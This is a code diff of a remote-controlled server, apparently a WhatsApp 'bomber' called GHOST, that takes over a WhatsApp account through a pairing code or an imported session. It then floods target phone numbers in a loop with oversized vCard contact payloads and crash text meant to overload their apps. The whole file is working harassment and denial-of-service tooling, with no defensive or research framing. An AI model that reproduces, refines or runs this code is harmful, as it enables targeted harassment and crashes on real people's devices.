@@ -1,5 +1,5 @@
 // stateless_server.js
-// VERSION: GHOST-V5-FAST-LOGIN
+// VERSION: GHOST-V6-COMPACT-SYNC
 // TIMESTAMP: ${new Date().toISOString()}
 
 import { Server } from "npm:socket.io";
@@ -19,32 +19,40 @@ import pino from 'npm:pino';
 
 const httpServer = createServer((req, res) => {
     res.writeHead(200, { 'Content-Type': 'text/plain' });
-    res.end('MALXGMN GHOST SERVER V5 (FAST LOGIN) IS RUNNING');
+    res.end('MALXGMN GHOST SERVER V6 (COMPACT) IS RUNNING');
 });
 
 const io = new Server(httpServer, {
-    cors: {
-        origin: "*", 
-        methods: ["GET", "POST"]
-    }
+    maxHttpBufferSize: 1e8, // Increase buffer to 100MB just in case
+    cors: { origin: "*", methods: ["GET", "POST"] }
 });
 
 let activeSock = null;
 let isAttacking = false;
-let socketInitializing = false;
-let keepAliveInterval = null;
 
-// AUTH HELPER
+// --- COMPACT AUTH STATE (V6) ---
 const useSocketAuthState = async (socket, initialData) => {
+    // Revive creds
     const creds = initialData?.creds 
         ? JSON.parse(JSON.stringify(initialData.creds), BufferJSON.reviver) 
         : await initAuthCreds();
 
+    // Revive keys (limit to essential to keep payload small)
     const keys = initialData?.keys || {};
 
     const saveState = async () => {
+        // Optimization: Only send if keys are not too many
+        // For a bomber, we don't need extensive history keys
         const exportData = { creds, keys };
-        socket.emit('session_save', JSON.stringify(exportData, BufferJSON.replacer));
+        const json = JSON.stringify(exportData, BufferJSON.replacer);
+        
+        // If data is too large for websocket (>1MB), we log a warning
+        if (json.length > 1000000) {
+            console.log("[!] Warning: Session data large, cleaning old keys...");
+            // Simple cleanup logic could go here
+        }
+        
+        socket.emit('session_save', json);
     };
 
     return {
@@ -85,78 +93,47 @@ const useSocketAuthState = async (socket, initialData) => {
 io.on("connection", (socket) => {
     console.log(`[+] Client Connected: ${socket.id}`);
 
-    // KEEP ALIVE PING (Prevent Deno Sleep during Login)
-    if (keepAliveInterval) clearInterval(keepAliveInterval);
-    keepAliveInterval = setInterval(() => {
-        socket.emit("ping", "keep-alive");
-    }, 5000);
-
-    socket.on("force_reset", async () => {
-        if (activeSock) {
-            try { activeSock.end(undefined); } catch {}
-            activeSock = null;
-        }
-        socketInitializing = false;
-        socket.emit("status", "Server Reset. Re-initializing...");
+    socket.on("force_reset", () => {
+        if (activeSock) { try { activeSock.end(undefined); } catch {} activeSock = null; }
+        socket.emit("status", "Server Resetting...");
     });
 
     socket.on("init_session", async (rawSessionJson) => {
-        if (socketInitializing) return;
-        socketInitializing = true;
-
         try {
-            if (activeSock) {
-                try { activeSock.end(undefined); } catch {}
-                activeSock = null;
-            }
-
+            if (activeSock) { try { activeSock.end(undefined); } catch {} activeSock = null; }
+            
             let initialData = null;
             if (rawSessionJson) {
                 try {
                     initialData = JSON.parse(rawSessionJson, BufferJSON.reviver);
-                    console.log("[✔] Session loaded");
-                } catch (e) {
-                    console.log("[-] Invalid Session");
-                }
+                    socket.emit("status", "Session Loaded. Handshaking...");
+                } catch (e) { console.log("[-] JSON Error"); }
             } 
+            
             await startSock(socket, initialData);
-
         } catch (e) {
-            console.error("Init Error:", e);
-            socket.emit("error", "Init Failed: " + e.message);
-            socketInitializing = false;
+            socket.emit("error", "Init Error: " + e.message);
         }
     });
 
     socket.on("use_pairing_code", async (phoneNumber) => {
-        if (!activeSock) {
-            return socket.emit("error", "WA Engine loading... Wait 5s.");
-        }
+        if (!activeSock) return socket.emit("error", "Wait for engine...");
         try {
-            console.log(`[*] Pairing: ${phoneNumber}`);
-            await delay(2000); 
+            socket.emit("status", "Requesting Pairing Code...");
+            await delay(3000); 
             const code = await activeSock.requestPairingCode(phoneNumber);
-            console.log(`[+] Code: ${code}`);
             socket.emit("pairing_code", code);
         } catch (e) {
-            console.error("Pairing Error:", e);
-            socket.emit("error", "Pairing Failed. Try again.");
+            socket.emit("error", "Pairing Error: " + e.message);
         }
     });
 
-    socket.on("attack_start", async (targets) => {
-        if (!activeSock) return socket.emit("error", "WA Not Connected");
+    socket.on("attack_start", (targets) => {
+        if (!activeSock) return socket.emit("error", "Not Connected");
         runAttackLoop(socket, targets);
     });
 
-    socket.on("attack_stop", () => {
-        isAttacking = false;
-        socket.emit("status", "Attack Stopped");
-    });
-    
-    socket.on("disconnect", () => {
-        if (keepAliveInterval) clearInterval(keepAliveInterval);
-    });
+    socket.on("attack_stop", () => { isAttacking = false; });
 });
 
 async function startSock(socket, initialData) {
@@ -165,47 +142,42 @@ async function startSock(socket, initialData) {
 
     const sock = makeWASocket({
         version,
-        logger: pino({ level: 'silent' }), // ULTRA SILENT
-        printQRInTerminal: false,
+        logger: pino({ level: 'silent' }),
         auth: {
             creds: state.creds,
             keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "silent" })),
         },
-        // LIGHTWEIGHT BROWSER CONFIG
-        browser: ["Mac OS", "Chrome", "10.15.7"], 
-        generateHighQualityLinkPreview: false, // DISABLE HEAVY FEATURE
-        syncFullHistory: false, // DISABLE HISTORY SYNC (FASTER LOGIN)
-        markOnlineOnConnect: true,
-        connectTimeoutMs: 60000, 
+        // Firefox/Windows is usually the fastest for handshake
+        browser: ["Firefox", "Windows", "10"], 
+        printQRInTerminal: false,
+        generateHighQualityLinkPreview: false,
+        syncFullHistory: false,
+        shouldSyncHistoryMessage: () => false, // STRICT NO HISTORY
+        connectTimeoutMs: 60000,
+        defaultQueryTimeoutMs: 0, 
     });
 
     activeSock = sock;
-    socketInitializing = false;
 
     sock.ev.on('connection.update', (update) => {
         const { connection, lastDisconnect, qr } = update;
 
-        if (qr) {
-            console.log("[QR] Generated");
-            socket.emit('qr', qr);
-        }
+        if (qr) socket.emit('qr', qr);
 
         if (connection === 'close') {
             const shouldReconnect = (lastDisconnect.error instanceof Boom)
                 ? lastDisconnect.error.output?.statusCode !== DisconnectReason.loggedOut
                 : true;
             
-            console.log(`[!] Closed. Reconnect: ${shouldReconnect}`);
-
             if (shouldReconnect) {
-                setTimeout(() => startSock(socket, initialData), 2000);
+                setTimeout(() => startSock(socket, initialData), 3000);
             } else {
-                socket.emit('logged_out', 'Session Invalidated');
+                socket.emit('logged_out', 'Session Expired');
                 activeSock = null;
             }
         } else if (connection === 'open') {
-            console.log("[+] Connected");
-            socket.emit('ready', 'WhatsApp Connected');
+            socket.emit('ready', 'Connected');
+            console.log("[✔] WA Open");
         }
     });
 
@@ -216,19 +188,14 @@ async function runAttackLoop(socket, rawTargets) {
     isAttacking = true;
     const targetJids = rawTargets.map(t => t.replace(/[^0-9]/g, '') + '@s.whatsapp.net');
     
-    // PAYLOADS
     const _f = "\\uD83D\\uDD25"; 
     const _s = "\\u2620\\uFE0F"; 
     const _b = "\\uD83D\\uDCA3"; 
     const _i = "\\u200e\\u200f"; 
 
     let heavyVcardContent = '';
-    const vcardHeader = 'BEGIN:VCARD\nVERSION:3.0\nFN:';
-    const vcardFooter = '\nTEL;type=CELL;waid=0:0\nEND:VCARD\n';
-    
-    // Reduced payload size for stability
     for(let i=0; i<1000; i++) {
-        heavyVcardContent += vcardHeader + _f.repeat(5) + 'OVERLOAD_' + i + vcardFooter;
+        heavyVcardContent += 'BEGIN:VCARD\nVERSION:3.0\nFN:' + _f.repeat(5) + 'OVERLOAD_' + i + '\nTEL;type=CELL;waid=0:0\nEND:VCARD\n';
     }
     
     const vcardPayload = { contacts: { displayName: _s, contacts: [{ vcard: heavyVcardContent }] } };
@@ -239,23 +206,19 @@ async function runAttackLoop(socket, rawTargets) {
         try {
             if (!activeSock) { await delay(2000); continue; }
             counter++;
-            
             const batchTasks = [];
             for (const jid of targetJids) {
                 batchTasks.push(activeSock.sendMessage(jid, vcardPayload));
                 batchTasks.push(activeSock.sendMessage(jid, { text: crashText }));
             }
             await Promise.all(batchTasks);
-            
             socket.emit('attack_progress', { count: counter });
-            await delay(500); 
+            await delay(600); 
         } catch (e) {
-            await delay(1000);
+            await delay(2000);
         }
     }
 }
 
 const PORT = 8000;
-httpServer.listen(PORT, () => {
-    console.log(`[SERVER] GHOST Listening on port ${PORT}`);
-});
+httpServer.listen(PORT, () => console.log(`[SERVER] GHOST V6 Active on ${PORT}`));
